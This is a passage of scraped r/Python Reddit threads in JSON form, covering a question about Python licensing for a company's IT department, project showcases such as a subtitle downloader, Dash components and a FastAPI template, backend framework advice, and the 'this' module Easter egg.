    "post_content": "I’m an intern in a company and I automated some processes using python. My company’s IT wing said that as long as it is a licensed software you can use it in our company.\nIn my mind I was like where the f I’m going to get a license for an open source software.\nNote : They mention that another team has been using licensed python. I thought either IT is so stupid or that team is so smart that they brought license for pycharm or anaconda (claim that it is a Python license) and fooled IT.\nIf I am wrong then tell me where I can get that license.\nAnd I am also looking for job in data analyst.",
    "comments": [
        {
            "author": "Col_Crunch",
            "score": "875",
            "content": "You don’t have to purchase a license to have a license. If they ask for the license send them here: https://docs.python.org/3/license.html#psf-license",
            "replies": [
                {
                    "author": "vikashgraja",
                    "score": "281",
                    "content": "I know but they want a paid version 😂😂😂",
                    "replies": [
                        {
                            "author": "prema_van_smuuf",
                            "score": "997",
                            "content": "Sell it to them 🤷‍♂️",
                            "replies": [
                                {
                                    "author": "AsstDepUnderlord",
                                    "score": "385",
                                    "content": "Many years ago (before open source was what it is today) I had a similar experience. I wrote a bunch of code for interpreting the outputs of some scientific equipment. It was my fault for asking, but the IT department told me that I needed a license and receipt to use it. I crafted a receipt for $100 for it, licensed in perpetuity. I’ll be darned if they didn’t pay me the $100. Since I already did it on their time, I bought pizza for the lab and invited the IT guys. ($100 used to buy a lot of pizza). We all decided that we had done “the responsible thing” and set in motion a recurring “product release” schedule."
                                },
                                {
                                    "author": "Johny_D_Doe",
                                    "score": "71",
                                    "content": "This is the right response"
                                }
                            ]
                        },
                        {
                            "author": "timrichardson",
                            "score": "33",
                            "content": "https://www.anaconda.com/blog/anaconda-commercial-edition-faq Maybe the other dept is using this."
                        },
                        {
                            "author": "andynzor",
                            "score": "34",
                            "content": "Yes. There are legal departments that are this dumb. They don't want to risk fighting in court over legalese they didn't personally sign.",
                            "replies": [
                                {
                                    "author": "Antrikshy",
                                    "score": "13",
                                    "content": "This is the kind of company that this page addresses: https://sqlite.org/purchase/license"
                                }
                            ]
                        },
                        {
                            "author": "Kerbart",
                            "score": "11",
                            "content": "If your main use is data science consider Anaconda. Since it comes with all the (data) science stuff you’re also covered for those libraries."
                        },
                        {
                            "author": "sanitylost",
                            "score": "10",
                            "content": "Use the anaconda package and tell them that by paying for the sub, you get access to the \"verified\" packages. Not lying and you get to go about your day."
                        },
                        {
                            "author": "Amgadoz",
                            "score": "7",
                            "content": "\"This is a paid version that costs 0.00$\""
                        },
                        {
                            "author": "verticalfuzz",
                            "score": "6",
                            "content": "Anaconda has a paid tier with enterprise support and vetted packages, i think"
                        }
                    ]
                }
            ]
        },
        {
            "author": "PossibilityTasty",
            "score": "200",
            "content": "Python is Open Source software, it comes with a free license already. There is a files LICENSE in the source code distribution if you need details."
        },
        {
            "author": "PurepointDog",
            "score": "157",
            "content": "Amazing. I think Anaconda fits this description mostly though. You can get an enterprise support licenses for lots of major open source tools like DBeaver, Polars, etc. They're a great way to get a company onboard, and also help give back to the dev teams that made the awesome tools in the first place.",
            "replies": [
                {
                    "author": "vikashgraja",
                    "score": "32",
                    "content": "Great idea"
                },
                {
                    "author": "ogrinfo",
                    "score": "20",
                    "content": "Yep, we stopped using conda at our company because they removed commercial support from their free tier. If your company wants to pay for something, that would work. Whether using conda is better than sticking with pip and virtualenv is another debate."
                }
            ]
        },
        {
            "author": "muluman88",
            "score": "41",
            "content": "ActiveState and Anaconda offer commercially supported Python distributions, I guess that is what the IT department has in mind. By paying those companies for providing the interpreter and packages, the obligation to check for security or foss license issues is outsourced and there is someone to sue if something goes wrong."
        },
        {
            "author": "fiskfisk",
            "score": "71",
            "content": "Ask your IT department. They're the only ones who can answer what they accept. Include suggestions (such as Anaconda) and let them say which ones are acceptable."
        },
        {
            "author": "AdventurousMinute334",
            "score": "18",
            "content": "I must ask, and it's an even more tricky one than Python itself. How do your company handle each external library, from pip as one example? Every package is a licensed software."
        },
        {
            "author": "jmacey",
            "score": "13",
            "content": "What OS are you using? If Linux and something like RHEL it comes bundled as part of the system so is part of the subscription."
        }
    ]
},
{
    "post_author": "sameera__madushan_",
    "post_id": "g10v5z",
    "post_score": "2248",
    "post_time": "Tuesday, April 14, 2020 at 10:08:43 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a python script to download subtitles for your movies...",
    "media": [
        "https://preview.redd.it/kj5vvd1weqs41.gif?width=640&crop=smart&format=png8&s=c498658878712f467e319885e32ba603ed6d867e"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "AltezaHumilde",
            "score": "121",
            "content": "Amazing job, if you rename the subtitle in the end step same name as the movie file you won't need to drop it into the window, will get it automatically. Also, do you can add a feature to offset the subtitle file like some customized amount of seconds after or before it would be fucking amazing."
        },
        {
            "author": "sameera__madushan_",
            "score": "86",
            "content": "GitHub - https://github.com/sameera-madushan/SubtitleBOX"
        },
        {
            "author": "dePliko",
            "score": "26",
            "content": "Wow nice. You could make it automatically sync to the video (if it's not synced), but that's way harder. Do you accept contributions to the Github page?"
        },
        {
            "author": "strghst",
            "score": "40",
            "content": "Found a small thing in your code. When scrapping the filename, you delete last 4 chars before putting .srt to the new file. In this case, if a file is formatted in some format that isn't 3 letters (webm, for example) - you will get issues. A better approach would be to traverse the name until you find the last dot in it (rfind function of string), and cut from beggining to that point. filename = file_path[:-4] This is the line I'm talking about. Other than that - I recommend defining functions first, and only then executing them. What I mean: your while True should contain all calls, better not leave them in between functions (harder to follow). Nevertheless, a small yet useful thing. Great job!"
        },
        {
            "author": "cymrow",
            "score": "14",
            "content": "I'm a little late to the party here, but someone should mention subliminal, another Python project which I've been using for years."
        },
        {
            "author": "[deleted]",
            "score": "9",
            "content": "Only works on Windows, because you've used ctypes.windll. I'm sure there's some OS agnostic way to start an open file dialog with python."
        },
        {
            "author": "IMJoeTheBro",
            "score": "7",
            "content": "Does it work for TV shows?"
        },
        {
            "author": "v3ritas1989",
            "score": "19",
            "content": "that bird on your desktop background looks as if that girl is wearing its siblings."
        },
        {
            "author": "[deleted]",
            "score": "12",
            "content": "Is it possible to learn this power?"
        }
    ]
},
{
    "post_author": "Soolsily",
    "post_id": "1cw486p",
    "post_score": "11",
    "post_time": "Monday, May 20, 2024 at 4:48:23 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Dash Pip Components",
    "media": [
        "https://pip-docs.onrender.com/",
        "https://github.com/pip-install-python/pip-docs"
    ],
    "post_content": "What My Project Does\nHey everyone, just released 8 new pip components for plotly and dash including:\nFull Calendar Component - A Full Calendar Component for Dash\nDash Summernote - A rich text WYSIWYG Editor for Dash\nDash Emoji Mart - A Slack-like Emoji Picker for Dash\nDash Charty - A Charting Library for Dash\nDash Image Gallery - A Image Gallery Component for Dash\nDash Swiper - A Swiper Component for Dash\nDash Insta Stories - An Instagram Stories Component for Dash\nDash Credit Cards - A Credit Card Component for Dash\nDocumentation can be found here:\nhttps://pip-docs.onrender.com/\nThe repo for the github can be found here:\nhttps://github.com/pip-install-python/pip-docs\nTarget Audience\nPlotly dash and Python developers.\nComparison \nAll these are new components for the dash framework, but based on javascript or react projects which were forked and edited to work specifically for dash.",
    "comments": []
},
{
    "post_author": "shekhuu",
    "post_id": "1cuxatg",
    "post_score": "0",
    "post_time": "Saturday, May 18, 2024 at 4:26:28 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "FastAPI Backend Template for SaaS products",
    "media": [
        "https://github.com/shekhuverma/FastAPI-SaaS-Template"
    ],
    "post_content": "Hello there, I just created a template for creating a backend for your SaaS products.\nWhat my project does: It is a FastAPI project/template for creating SaaS backends and admin dashboards.\nComparison: \nOut of the box, it supports\nLicence key generation and validation.\nOAuth 2 authentication with scopes.\nEndpoints with pagination and filters to easily integrate with an admin dashboard.\nPasswords are securely stored using hashing.\nused PostgreSQL for database\nTarget Audience: Production\nCheck it here!\nUpdate 1: Added pre-commit hooks, tox for testing and linting.",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "TesNikola",
            "score": "5",
            "content": "You didn't list anything about billing. I think that's probably more key than any license key feature that is presumably interchangeable with a binary flag in a controlled environment. Not sure I understand the concept of licensing keys on a SaaS vs on-prem option.",
            "replies": [
                {
                    "author": "shekhuu",
                    "score": "1",
                    "content": "Yes, it's for on-prem software which requires license keys to work.",
                    "replies": [
                        {
                            "author": "TesNikola",
                            "score": "3",
                            "content": "So how are you protecting the source code for that? I've been on the hunt for a while for a solution in Python similar to PHP's Ioncube, Zend, etc... I'm not entirely sure on this, but I don't think on-prem exactly meets the definition of SaaS.",
                            "replies": [
                                {
                                    "author": "chub79",
                                    "score": "2",
                                    "content": "Since the op has decided to just not respond to your question. It's a problem I have faced recently and I've decided against the route of a license key in that context. There is no way to protect the mechanism with the key so it's just easier to remove the issue entirely and look at from a different angle IMO. Specifically, I took it to: ensuring the agreement signed with the customer was rather clear with the context in which the software can be used. This allows to set the rules governing how we would respond in case of breach Contant communication with my custoemrs to understand how their success with the product. If you start hearing other teams want to try it (or are already doing it's, it's a cue to get the sales hat on again :p From my perspective, the success is measured if they want to use it more :)"
                                },
                                {
                                    "author": "shekhuu",
                                    "score": "-3",
                                    "content": "Let me explain. I created a VBA based plugin for Ms-excel and to distribute that, i created a similar backend which can generate and email the licence keys to the users, a react based dashboard to manage users (edit their details, revoke licences,etc). This project is the skeleton structure which i open sourced so that other people can take help, i removed all the application specific code to make it general purpose. I hope you got some clarity now"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "jackshec",
            "score": "1",
            "content": "Nicely done, your missing a license file",
            "replies": [
                {
                    "author": "shekhuu",
                    "score": "2",
                    "content": "Thanks for pointing out, I will add it :D"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cw25ip",
    "post_score": "11",
    "post_time": "Monday, May 20, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "dataquestio",
            "score": "1",
            "content": "Project Idea: Profitable App Profiles for the App Store and Google Play Markets Difficulty: Beginner Tech Stack: Python, Jupyter Notebook Description: In this project, you’ll assume the role of a data analyst at a company that builds free, ad-supported apps for Android and iOS. Since the company’s revenue depends on in-app ads, your task is to analyze historical data from app markets to determine which kinds of apps attract the most users. Using Python, you’ll clean the provided datasets and analyze them using frequency tables and averages to identify trends. By working through a complete data science workflow, you’ll develop hands-on experience in data-driven decision making to inform business strategy. Finally, you’ll make recommendations on the app profiles the company should pursue to maximize users and ad revenue. Objective: Analyze mobile app market data to recommend app development strategies that maximize user engagement and advertising profits. Resources: Step-by-step guide with solution notebook"
        }
    ]
},
{
    "post_author": "Stanulilic",
    "post_id": "1cwm734",
    "post_score": "16",
    "post_time": "Monday, May 20, 2024 at 9:11:27 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "A Beginner's Guide to Unit Testing with Pytest",
    "media": [
        "https://www.reddit.com/r/python/",
        "https://betterstack.com/community/guides/testing/pytest-guide/"
    ],
    "post_content": "Hey r/python!\nI wrote a guide on how to use Pytest, covering a bunch of important features like designing tests, filtering tests, parameterizing tests, fixtures, and more. Check it out on this link.",
    "comments": [
        {
            "author": "TequilaTech1",
            "score": "0",
            "content": "so, you re-wrote the docs?",
            "replies": [
                {
                    "author": "No_Poem_1136",
                    "score": "1",
                    "content": "You know that tutorials are different kinds of documentation then say, a manual, right? I mean why even have schools if we have books, right?"
                }
            ]
        }
    ]
},
{
    "post_author": "LyricalAlien",
    "post_id": "exiubj",
    "post_score": "2248",
    "post_time": "Sunday, February 2, 2020 at 7:21:28 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "I'll be damned",
    "media": [
        "https://i.redd.it/5kfs3x27tfe41.png",
        "https://preview.redd.it/5kfs3x27tfe41.png?width=640&crop=smart&auto=webp&s=474bfd76b917b7a0689cfa96fc67b27e841206da"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "iamjaiyam",
            "score": "518",
            "content": "Indian programmer going where no programmer has gone before.",
            "replies": [
                {
                    "author": "ashmoreinc",
                    "score": "69",
                    "content": "That post nut clarity hit you good",
                    "replies": [
                        {
                            "author": "benargee",
                            "score": "32",
                            "content": "That POST nut clarity hit you good",
                            "replies": [
                                {
                                    "author": "Terence_McKenna",
                                    "score": "20",
                                    "content": "We GET it."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "195",
            "content": "That's Abhishek Sagar and he assumes that he's a hacker himself. He's just a script kiddy and he don't even know anything about hacking. His videos are clickbaits",
            "replies": [
                {
                    "author": "ak2703",
                    "score": "147",
                    "content": "Can't you see he has hacker mask in background ? He is definitely legit hacker."
                }
            ]
        },
        {
            "author": "atomicspace",
            "score": "75",
            "content": "that’s hot"
        }
    ]
},
{
    "post_author": "AbideByReason",
    "post_id": "1cu9jz1",
    "post_score": "14",
    "post_time": "Friday, May 17, 2024 at 7:26:12 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a Mandelbrot Zoom using Python",
    "media": [
        "https://github.com/AbideByReason/Python_Notebooks/tree/main",
        "https://youtu.be/HtNUFdh2sjg"
    ],
    "post_content": "I made a YouTube video which previews the zoom and explains the code, which you can find here: https://youtu.be/HtNUFdh2sjg\nWhat my project does: it creates a Mandelbrot Zoom.\nComparison: it uses Pillow and consists of just 2 main blocks of code: one is the main function that finds which points are in the Mandelbrot Set and the other is the main loop that applies appropriate colors to each image. It gives the option of being black and white OR in color.\nIt works fairly well but can definitely be faster if parallelized. I'd love to hear any suggestions on how it can be improved.\nTarget Audience: fun/toy project\nSource code is here: https://github.com/AbideByReason/Python_Notebooks/tree/main",
    "comments": [
        {
            "author": "hmiemad",
            "score": "2",
            "content": "One quick suggestion. Instead of doing two for loops to go through the pixels, build a numpy 2d array with complex numbers for coordinates. Then you apply np.square to the whole thing and add coordinates. You can also create a mask for abs>2 before squaring. A third 2d array to store the number of steps before reaching abs>2, for coloring. In numpy you can ser the datatype to NPY_COMPLEX128 to have more precision. Also, keeping the pixels at places with \"nice\" binary representation will enhance visualization and calculation. Great job.",
            "replies": [
                {
                    "author": "denehoffman",
                    "score": "2",
                    "content": "There are also some modifications to the algorithm that involve fewer multiplications fyi"
                },
                {
                    "author": "johnnySix",
                    "score": "2",
                    "content": "Numpy is so much faster than a loop."
                },
                {
                    "author": "AbideByReason",
                    "score": "1",
                    "content": "Thanks for the really helpful comment. This will make it a lot more efficient. I'll definitely implement these changes."
                }
            ]
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "gq8254",
    "post_score": "2167",
    "post_time": "Monday, May 25, 2020 at 12:35:02 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I created \"twenny\" – my very first app! It reminds you to give your eyes a break every 20 minutes to prevent eye strain and is located in your menubar. You can download it on GitHub!",
    "media": [
        "https://i.redd.it/lw9qnqd4sv051.png",
        "https://preview.redd.it/lw9qnqd4sv051.png?width=640&crop=smart&auto=webp&s=d4cf04ab8631439eed1c24463ce3d0b63fa6f3f6"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "189",
            "content": "How can i see the \"you can work now\" when i should look away xD nice app :)",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "104",
                    "content": "There's a sound, but you are kind of screwed if you have your speakers on mute...",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "19",
                            "content": "Maybe a couple big flashes on the screen of white would be nice so you can see it out of the corner of your eye. Nice program!"
                        },
                        {
                            "author": "[deleted]",
                            "score": "2",
                            "content": ";)"
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "94",
            "content": "Tips: Make installabel via pip Make it runnable via commandline \"twenny\" Add something like \"twenny install\" that will install it and add it to auto-start"
        },
        {
            "author": "WillMorrisson",
            "score": "143",
            "content": "Nice app! I should use something like that to remind me to regularly drink water. I tend to \"forget\" drinking while I'm working."
        },
        {
            "author": "[deleted]",
            "score": "31",
            "content": "Download the latest version here: https://github.com/tagwohl/twenny/releases/tag/v1.1 GitHub: https://github.com/tagwohl/twenny Enjoy!"
        },
        {
            "author": "[deleted]",
            "score": "25",
            "content": "Now make a port to alert your boss when you don't look at screen for more than a minute, and boom - you contributed to dystopian society :P"
        },
        {
            "author": "jabbalaci",
            "score": "14",
            "content": "Great! Here's a simplified Linux clone that could be improved by someone: #!/usr/bin/env python3 import gi gi.require_version('Notify', '0.7') from gi.repository import Notify def show_message(upper, lower): Notify.init(upper) note = Notify.Notification.new(upper, lower, \"dialog-information\") note.show() def main(): show_message(\"twenny clone\", \"It's time, look away for 20 seconds!\") ##### if __name__ == \"__main__\": main() Tested under Manjaro with Xfce4. Edit: dependencies: libnotify, python-gobject . Source: https://wiki.archlinux.org/index.php/Desktop_notifications#Python"
        },
        {
            "author": "ned334",
            "score": "7",
            "content": "Well how do I see the \"back to work\" notification if I'm looking away, huh? Are you trying to get me to fired?"
        },
        {
            "author": "vieze_sos",
            "score": "3",
            "content": "Is it only for mac?"
        },
        {
            "author": "saad_mohammed",
            "score": "3",
            "content": "link for the github please..."
        },
        {
            "author": "d4vsanchez",
            "score": "3",
            "content": "Hey, amazing software. I just made a PR adding support to Linux using Qt framework. Hope I can improve it as I learn about PyQt."
        }
    ]
},
{
    "post_author": "poopatroopa3",
    "post_id": "1cvu4wb",
    "post_score": "7",
    "post_time": "Sunday, May 19, 2024 at 8:57:14 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a cheatsheet for pydash",
    "media": [
        "https://squidfunk.github.io/mkdocs-material/",
        "https://github.com/brunodantas/pydash-cheatsheet",
        "https://brunodantas.github.io/pydash-cheatsheet/en/"
    ],
    "post_content": "https://brunodantas.github.io/pydash-cheatsheet/en/\nWhat my project does: pydash is a library with great potential to make you code more Functional and simple. I made this cheatsheet a while ago to highlight some of the most useful functions of the library, since there are so many. I hope it's useful.\nTarget audience: anyone who is interested in pydash, functional programming, not reinventing the wheel.\nComparison: on Google you can find cheatsheets for Lodash, which is the original Javascript library which pydash is inspired by, but no cheatsheets for pydash itself. Note that many pydash functions are already implemented in modern Python, so I did not include those in the cheatsheet.\nI made this programatically using Material for Mkdocs, which I also recommend.\nhttps://github.com/brunodantas/pydash-cheatsheet",
    "comments": [
        {
            "author": "Snapix35",
            "score": "3",
            "content": "Can someone explain to me why you would used a lib like pydash (adding a dependancy) rather than doing it \"by hand\"? Seems like a left pad risk to me",
            "replies": [
                {
                    "author": "poopatroopa3",
                    "score": "1",
                    "content": "It's a matter of not reinvent the wheel. And as far as I know you can always have the source code of the lib downloaded locally."
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "2",
            "content": "I had never heard of this library. Ignoring that the name sounds too much like it’s related to plotly dash, I really don’t understand the point. It seems like it’s just some very generic/basic operations that are easy enough to implement by the user without much hassle. Having to import a whole other library just to do some basic filtering or data structure mangling seems like a really bad idea.",
            "replies": [
                {
                    "author": "poopatroopa3",
                    "score": "0",
                    "content": "I mean, it's basically the same reason people use requests instead of urllib, isn't it?",
                    "replies": [
                        {
                            "author": "yrubooingmeimryte",
                            "score": "1",
                            "content": "No, not at all. Both of those libraries would be difficult for a user to implement themselves. Have you actually looked at the source for pydash? Almost every function is a one liner that is directly returned. It would be like if someone made an “array” library where every function was called something like “to_array” and all it did was return np.array(x).",
                            "replies": [
                                {
                                    "author": "poopatroopa3",
                                    "score": "0",
                                    "content": "A lot of the one liners is just to have parity with Lodash. Don't strawman, it can be useful even if you dislike it."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "mathmul",
            "score": "2",
            "content": "I guess this is a mistake: \"Variants: drop_right_while, drop_while, drop_right_while\" and the first one should be \"take_right_while\""
        },
        {
            "author": "dyingpie1",
            "score": "1",
            "content": "I'm confused what I'm supposed to be looking at in your repo. You should make a pdf or something to look at.",
            "replies": [
                {
                    "author": "poopatroopa3",
                    "score": "2",
                    "content": "You should look at the first link at the top for the docs. I included the repo below as well because of the rules of the sub."
                }
            ]
        },
        {
            "author": "PurepointDog",
            "score": "1",
            "content": "Some of these functions are useless, I agree. Some are kinda nice though (eg flatten, case conversions, etc). I may use this one!"
        },
        {
            "author": "Advanced-Ad-2403",
            "score": "1",
            "content": "How to post my lib? All my messages are banned by spam filter, but my post looks pre same. Can somebody please help me"
        },
        {
            "author": "kenshinx9",
            "score": "2",
            "content": "Nice. That Mkdocs site is pretty cool too. I'm a fan of using lodash, and was looking for something similar with Python."
        }
    ]
},
{
    "post_author": "Clickyz",
    "post_id": "1croj1r",
    "post_score": "69",
    "post_time": "Tuesday, May 14, 2024 at 1:07:44 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Framework to use for backend",
    "media": [],
    "post_content": "Hello guys\nI recently decided to move from nodejs(expressjs) to python for general purposes but mostly for backend. I have couple of questions.\nWill i regret my migration to python? :)\nWhich framework you suggest for backend solo dev?\nAnd what tips are you suggesting me in general to get used to python.",
    "comments": [
        {
            "author": "riklaunim",
            "score": "57",
            "content": "There is Django for more classical websites (and it can do APIs), then Flask and FastAPI. Each unique/specific in style. Python overall is popular on the job market, often used to make APIs for JS SPAs, mobile apps and alike.",
            "replies": [
                {
                    "author": "Flame_Grilled_Tanuki",
                    "score": "17",
                    "content": "For adding a REST API to Django, I'd recommend Django-Ninja over Django REST Framework; particularly if you like Pydantic/FastAPI/Litestar.",
                    "replies": [
                        {
                            "author": "panatale1",
                            "score": "2",
                            "content": "I've not used Django-Ninja, but I'm a DRF advocate. What makes you recommend Ninja over DRF?",
                            "replies": [
                                {
                                    "author": "Flame_Grilled_Tanuki",
                                    "score": "2",
                                    "content": "It uses Pydantic models natively and replicates the bulk of the FastAPI/Litestar structure and behaviour. If you run multiple projects in both Django and these other APIs, it makes switch mental context between them a breeze."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Lachtheblock",
            "score": "27",
            "content": "I would really recommend Django for a first time. It provides a lot of structure out of the gate. It's a really useful tool to learn at what places you should have your abstractions. Where should you put your config, your views, your ETL jobs, your db migrations, etc. While not every framework is prescriptive, you still need to follow design patterns. Django is a great way to start to learn those (healthy) design patterns.",
            "replies": [
                {
                    "author": "jaypax",
                    "score": "20",
                    "content": "Also if you started with Django and find it to your liking, read Two Scoops of Django. It's not really \"Here's how to start using Django\", but \"Here's how to use Django well\""
                },
                {
                    "author": "johntellsall",
                    "score": "10",
                    "content": "Agree: Django's migrations framework (how to apply/rollback database changes) is second to none the ORM (high-level query language) is quite good template language is solid just enormous numbers of high-quality useful plugins: https://djangopackages.org/ It's not 100% unicorns and rainbows: there's a learning curve, and it can be over-opinionated. It's still my go-to for anything."
                }
            ]
        },
        {
            "author": "agritheory",
            "score": "32",
            "content": "I'm really surprised by the number of people recommending async frameworks to somebody with a Node background without providing context. They are not the same thing and are really closer to being opposite things. I think that async programming in python is hard or at least not beginner friendly, because there isn't a language-level event loop, which is one of the standout features of Node. And unlike JS, which is by comparison is quite forgiving about the function color problem, python is not. The folks who are recommending Django and Flask are on target, especially since those frameworks have lots of tutorial content and large communities. They can grow with your project without getting in the way. If somebody approached me to ask \"what language should I use on the backend\" I would want to know what kind of app they're building and if there's reason that any one language might offer an advantage. In the absence of this information, I think Node is usually the best choice."
        },
        {
            "author": "BluesFiend",
            "score": "54",
            "content": "Take a look at fastapi for the framework (if you are looking to do apis), and also look into ruff for lint/style/formatting paired with pre-commit to keep everything tidy (your own sanity, and future people looking at the code)"
        },
        {
            "author": "aherok",
            "score": "18",
            "content": "If you decided to move without a reason - yes, you will regret. What pushes you to migrate to completely other environment? As for the frameworks - I's stick with FastAPI or Django. Depending on use case and the things you want to build on you own or have ready OOTB."
        },
        {
            "author": "adastrongfeelinglace",
            "score": "9",
            "content": "Another take: You should never regret learning new things, but as for any change in technologies, you'll miss some things. Python's async story is mostly worse than node's, but the rest of the language is designed more sane for the most part. People mentioned the current big 3 frameworks already, but let me map them to the NodeJS ecosystem: Express.js -> Flask: minimalist, big plugin ecosystem, simple and unopionated Fastify -> FastAPI: opinionated on the tools to use (like logging), focus on async performance, great documentation, fast to learn Nest.js -> Django: *very* opinionated, basically specifies your application architecture; has everything built-in you need for 90% of all apps; takes some time to learn, but once you know it well you can be very productive"
        },
        {
            "author": "jkh911208",
            "score": "6",
            "content": "i would do FastAPI"
        }
    ]
},
{
    "post_author": "EvilDMP",
    "post_id": "dvw09b",
    "post_score": "2246",
    "post_time": "Wednesday, November 13, 2019 at 9:34:37 PM GMT+3",
    "flair_text": "Cool",
    "post_title": "BrachioGraph, an ultra-cheap Python-powered drawing machine",
    "media": [
        "https://external-preview.redd.it/Bk90BjlA-ZBfS5RAth2n9ru5rCy_QpauYqmHdFy6qWM.png?width=640&crop=smart&format=pjpg&auto=webp&s=5b9dfb3e69feb91e8985f13c15a89f707e178668"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "EvilDMP",
            "score": "152",
            "content": "All the code and building instructions: https://www.brachiograph.art.",
            "replies": [
                {
                    "author": "CN906",
                    "score": "28",
                    "content": "Awesome job, thanks for sharing."
                },
                {
                    "author": "drimago",
                    "score": "16",
                    "content": "this looks amazing and I am definitely adding it to the list of projects I will build with my son! quick question, is there a way to draw with color? By that I don't mean use a different color pen, but draw a color picture. I wonder if this process can be adapted to your machine: https://gph.is/2VkN5KY",
                    "replies": [
                        {
                            "author": "EvilDMP",
                            "score": "12",
                            "content": "Yes - I have an idea for how to achieve that! I have to think through the details first.",
                            "replies": [
                                {
                                    "author": "kurti256",
                                    "score": "1",
                                    "content": "Please could you make a link to that project here if you manage it please 😊"
                                }
                            ]
                        },
                        {
                            "author": "mangoed",
                            "score": "2",
                            "content": "Perhaps the easiest way is to swap the pens manually. The program needs to split the picture into color channels (maybe CMYK, but you can choose your custom colors), then trace each color separately into a vector image, then, after drawing one color, prompt you to change the pen.",
                            "replies": [
                                {
                                    "author": "drimago",
                                    "score": "1",
                                    "content": "Yes that's 2hat I was thinking about in broad stokes (pun most definitely intended!). The only issue I see is: at the end of the drawing the arm needs to come back to the same position where it started from. Otherwise it will draw the same picture starting from another position with a different colour. Anyway this is a great gadget to build!"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "naught-me",
            "score": "39",
            "content": "Those 2 little servos give a lot more precision than I'd expect."
        },
        {
            "author": "[deleted]",
            "score": "35",
            "content": "The shape of coding to come"
        }
    ]
},
{
    "post_author": "VladTbk",
    "post_id": "1cu26mq",
    "post_score": "37",
    "post_time": "Friday, May 17, 2024 at 1:49:50 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "this.s and this.d ",
    "media": [],
    "post_content": "Recently, I found out about the this \"Easter egg\" in python3. Adding import this into a py file will print \"The Zen of Python\" by Tim Peters. Also, this has two attributes: this.s and this.d, which I guess form the actual Easter egg. this.s returns an encrypted version of \"The Zen\" and this.d well, see for yourself, maybe you'll solve the puzzle.",
    "comments": [
        {
            "author": "JamzTyson",
            "score": "24",
            "content": "There are also this.i and this.c. The 4 attributes i, c, s, d are just implementation details to slightly obfuscate the code with ROT13 encoding."
        },
        {
            "author": "andrewowenmartin",
            "score": "6",
            "content": "result = [] for char in this.s: result.append(this.d.get(char,char)) print(\"\".join(result)) Not sure what this.c and this.i are for, this.c==97, this.i==25. (Oh, I think I see it now, thx u/markmuetz)",
            "replies": [
                {
                    "author": "Conscious-Ball8373",
                    "score": "3",
                    "content": "result = [this.d.get(char, char) for char in this.s] Surely?"
                }
            ]
        },
        {
            "author": "markmuetz",
            "score": "15",
            "content": "Hint: import inspect print(inspect.getsource(this))",
            "replies": [
                {
                    "author": "sausix",
                    "score": "7",
                    "content": "You don't need inspect magic. Just open this.py. It's a regular file."
                }
            ]
        }
    ]
},
{
    "post_author": "TraditionalDistrict9",
    "post_id": "1cvp53v",
    "post_score": "6",
    "post_time": "Sunday, May 19, 2024 at 5:09:59 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "IconMatch - find icons and letters positions from images!   ",
    "media": [
        "https://github.com/NativeSensors/IconMatch"
    ],
    "post_content": "Hey all,\nI am not the original creator, but found that 4yo project, and decided to revive it!\nWhat my project does: IconMatch is library allowing you to extract icons and letter positions from image or from display! There is also realtime demo on repo showcasing how it works!\nTarget Audience: For all detecting objects from display!\nComparison: I did not find other project like that - but it was my first find too! It is also not OCR!\nhttps://github.com/NativeSensors/IconMatch\nHave fun!",
    "comments": [
        {
            "author": "TraditionalDistrict9",
            "score": "1",
            "content": "Subscribe to us for free (me) on polar to get more info about our projects: https://polar.sh/feed"
        }
    ]
},
{
    "post_author": "Thinker_Assignment",
    "post_id": "1csox31",
    "post_score": "0",
    "post_time": "Wednesday, May 15, 2024 at 7:23:11 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "New Python-only abstractions for extracting data from apis",
    "media": [
        "https://github.com/dlt-hub/verified-sources/tree/master/sources/rest_api"
    ],
    "post_content": "Hey there, you are probably familiar with REST APIs.\nWe at dlt library added a new way to get data from apis (and dlt can already load it with best practice to db or parquet). We already did some internal hackathons but we would appreciate your feedback so we can improve it further\n- Our new REST API Source is a short, declarative configuration driven way of creating sources.\n- Our new REST API Client is a collection of Python helpers used by the above source, which you can also use as a standalone, config-free, imperative high-level abstraction for building pipelines.\nYou can read more about the source here or go to our docs for the REST APIClient info\nhttps://github.com/dlt-hub/verified-sources/tree/master/sources/rest_api\nPS: see you at Pycon Pittsburgh!",
    "comments": []
},
{
    "post_author": "iryna_kondr",
    "post_id": "1cu3xl7",
    "post_score": "1",
    "post_time": "Friday, May 17, 2024 at 3:29:53 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Building an LLM chat application using RAG Agent",
    "media": [
        "http://component.py/",
        "http://serve.py/",
        "https://ai.meta.com/blog/meta-llama-3/",
        "https://research.myshell.ai/open-voice",
